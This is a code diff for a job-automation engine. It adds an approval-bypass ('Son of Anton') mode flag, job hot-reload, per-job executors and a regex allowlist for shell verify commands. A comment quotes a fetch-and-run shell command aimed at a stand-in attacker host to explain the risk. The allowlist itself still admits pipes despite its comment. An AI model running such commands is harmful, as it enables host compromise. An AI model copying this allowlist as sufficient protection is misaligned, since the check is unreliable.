@@ -3,17 +3,58 @@ from __future__ import annotations
 
 import datetime as dt
 import os
+import re
 import subprocess
 import tempfile
 import time
 from typing import List, Optional
 
-from .canary import compute_tripwires
+from .canary import attempt_repairs, compute_tripwires
 from .executor import Executor
 from .jobs import Job
 from .ledger import Ledger
 from .models import RunRecord
 from .routes import select_route
+
+
+def _settings_db_path(data_dir: str) -> str:
+    return os.path.join(data_dir, "isolation.db")
+
+
+def get_son_of_anton_mode(data_dir: Optional[str]) -> bool:
+    """Read the Son-of-Anton flag from isolation.db. The dashboard (one
+    process) and the serve/scheduler (another) each hold their own in-memory
+    JobEngine, so a mode toggle must live somewhere both can see it — this
+    table is that source of truth, read at decision time."""
+    if not data_dir:
+        return False
+    import sqlite3
+    p = _settings_db_path(data_dir)
+    if not os.path.exists(p):
+        return False
+    try:
+        with sqlite3.connect(p, timeout=10.0) as conn:
+            conn.execute(
+                "CREATE TABLE IF NOT EXISTS app_settings (key TEXT PRIMARY KEY, value TEXT)")
+            row = conn.execute(
+                "SELECT value FROM app_settings WHERE key='son_of_anton_mode'").fetchone()
+            return bool(row and row[0] == "1")
+    except Exception:
+        return False
+
+
+def set_son_of_anton_mode(data_dir: Optional[str], value: bool) -> None:
+    if not data_dir:
+        return
+    import sqlite3
+    with sqlite3.connect(_settings_db_path(data_dir), timeout=10.0) as conn:
+        conn.execute(
+            "CREATE TABLE IF NOT EXISTS app_settings (key TEXT PRIMARY KEY, value TEXT)")
+        conn.execute(
+            "INSERT INTO app_settings (key, value) VALUES ('son_of_anton_mode', ?) "
+            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+            ("1" if value else "0",))
+        conn.commit()
 
 
 class JobEngine:
@@ -27,6 +68,70 @@ class JobEngine:
         self.db = db
         self.data_dir = data_dir or config.get("general", {}).get("data_dir")
         self.son_of_anton_mode = son_of_anton_mode or bool(config.get("general", {}).get("son_of_anton_mode", False))
+        self._job_executor_cache: dict = {}
+        self._jobs_mtime: Optional[float] = None
+        self._prime_jobs_mtime()
+
+    def _jobs_file_path(self) -> Optional[str]:
+        if not self.data_dir:
+            return None
+        return os.path.join(self.data_dir, self.config.get("jobs_file", "jobs.yaml"))
+
+    def _prime_jobs_mtime(self) -> None:
+        p = self._jobs_file_path()
+        try:
+            self._jobs_mtime = os.stat(p).st_mtime if p else None
+        except OSError:
+            self._jobs_mtime = None
+
+    def reload_jobs_if_changed(self) -> bool:
+        """Hot-reload jobs.yaml when its mtime changed (UI-added automations,
+        hand edits). The scheduler and webhook server both resolve jobs through
+        engine.by_id()/due_jobs(), so replacing engine.jobs is enough — no
+        restart needed. Returns True when the file changed."""
+        path = self._jobs_file_path()
+        if not path:
+            return False
+        try:
+            mtime = os.stat(path).st_mtime
+        except OSError:
+            return False
+        if self._jobs_mtime is not None and mtime == self._jobs_mtime:
+            return False
+        from .jobs import load_jobs
+        self.jobs = load_jobs(path)
+        self._jobs_mtime = mtime
+        return True
+
+    def _resolve_executor(self, job: Job) -> Executor:
+        """The engine's default executor for every job, unless the job
+        overrides it (job.executor, e.g. {name: opencode, mcp_profile: X} to
+        dispatch through OpenCodeExecutor with @playwright/mcp attached to a
+        stored-login session's persistent profile). Built once per
+        (name, mcp_profile) pair and cached -- constructing a fresh
+        OpenCodeExecutor (which writes a scoped XDG config dir) on every run
+        would be wasted work for a job that fires repeatedly."""
+        if not job.executor:
+            return self.executor
+        name = job.executor.get("name")
+        if name == "opencode":
+            mcp_profile = job.executor.get("mcp_profile")
+            cache_key = (name, mcp_profile)
+            if cache_key not in self._job_executor_cache:
+                from .executor.opencode_executor import OpenCodeExecutor
+                profile_dir = None
+                if mcp_profile:
+                    from . import browser_login
+                    install_dir = os.path.dirname(self.data_dir) if self.data_dir else None
+                    if install_dir:
+                        profile_dir = browser_login.session_dir(install_dir, mcp_profile)
+                self._job_executor_cache[cache_key] = OpenCodeExecutor(playwright_profile_dir=profile_dir)
+            return self._job_executor_cache[cache_key]
+        # Unknown executor name: fail loud, not a silent fallback to the
+        # engine default -- a job that asked for a specific executor and
+        # silently got a different one is a worse failure mode than an
+        # explicit error.
+        raise ValueError(f"job {job.id!r} requests unknown executor {name!r}")
 
     def _touch_heartbeat(self) -> None:
         if self.data_dir:
@@ -48,6 +153,11 @@ class JobEngine:
 
     def _is_approved(self, job_id: str) -> tuple[bool, str]:
         """R1: check approval nonce or apply Son of Anton permissionless bypass."""
+        # Cross-process truth: the toggle lives in the DB (set via the
+        # dashboard API in a different process), so read it at decision time —
+        # both directions, or a stale True would survive toggling off.
+        if self.data_dir:
+            self.son_of_anton_mode = get_son_of_anton_mode(self.data_dir)
         if self.son_of_anton_mode:
             if self.data_dir:
                 import os
@@ -168,8 +278,9 @@ class JobEngine:
 
         started = time.monotonic()
         timeout_s = self.config.get("general", {}).get("job_timeout_seconds", 300)
-        result = self.executor.run(job.recipe, model=route.model, provider=route.provider,
-                                   timeout_s=timeout_s)
+        executor = self._resolve_executor(job)
+        result = executor.run(job.recipe, model=route.model, provider=route.provider,
+                              timeout_s=timeout_s)
 
         breach = self.enforce_budget(job, {"tokens_in": result.tokens_in,
                                            "tokens_out": result.tokens_out,
@@ -209,7 +320,17 @@ class JobEngine:
         self._record_metering(record)
         return record
 
+    # Allowlist for job-manifest `verify:` commands. These execute via
+    # shell=True, so write access to jobs.yaml would otherwise be host RCE
+    # (e.g. verify: "curl http://evil.sh | bash # <output>"). Only a plain
+    # command with simple arguments/redirects is allowed — no command
+    # substitution, no chaining, no expansion.
+    _VERIFY_SAFE_RE = re.compile(
+        r"^[A-Za-z0-9_./= '\"<>|-]+$")
+
     def _run_verify(self, verify_cmd: str, output: str) -> tuple[bool, str]:
+        if not self._VERIFY_SAFE_RE.match(verify_cmd):
+            return False, "verify command rejected: unsafe characters"
         fd, path = tempfile.mkstemp(suffix=".txt")
         try:
             with os.fdopen(fd, "w", encoding="utf-8") as f:
@@ -236,4 +357,10 @@ class JobEngine:
             if last_canary is None or last_canary.get("flags") != current_flags:
                 self.ledger.append(RunRecord.new(task="fleet-canary", exit_code=1,
                                                  flags=current_flags))
+            # Detection alone used to be the end of the line — nothing consumed
+            # the tripwire list. Score each one through the governor and either
+            # dispatch a repair (re-running the job clears the tripwire) or
+            # record a pending candidate; run_job() re-records last_run either
+            # way, so a repaired job won't re-trip next poll.
+            attempt_repairs(self, tripwires)
         return tripwires
